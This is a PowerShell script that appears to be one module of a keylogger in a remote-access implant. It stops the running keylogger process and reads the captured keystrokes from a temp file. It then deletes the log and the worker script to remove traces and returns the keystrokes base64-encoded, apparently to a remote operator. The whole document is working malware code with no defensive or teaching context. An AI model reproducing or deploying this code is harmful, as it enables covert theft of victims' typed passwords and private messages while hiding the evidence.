param($args)

$channelID = $env:ChannelID
$logFile = "$env:TEMP\keylog_$channelID.txt"
$pidFile = "$env:TEMP\keylog_pid_$channelID.txt"
$workerScript = "$env:TEMP\keylog_worker_$channelID.ps1"

# Kill the process
if (Test-Path $pidFile) {
    $pidRunning = Get-Content $pidFile
    Stop-Process -Id $pidRunning -Force -ErrorAction SilentlyContinue
    Remove-Item $pidFile -Force -ErrorAction SilentlyContinue
}

# Wait for file to be released
Start-Sleep -Seconds 2

# Read and return log file
if (Test-Path $logFile) {
    $content = Get-Content $logFile -Raw
    Remove-Item $logFile -Force -ErrorAction SilentlyContinue
    Remove-Item $workerScript -Force -ErrorAction SilentlyContinue
    if ($content) {
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($content)
        [System.Convert]::ToBase64String($bytes)
    } else {
        "No keystrokes recorded."
    }
} else {
    "Keylogger not running."
}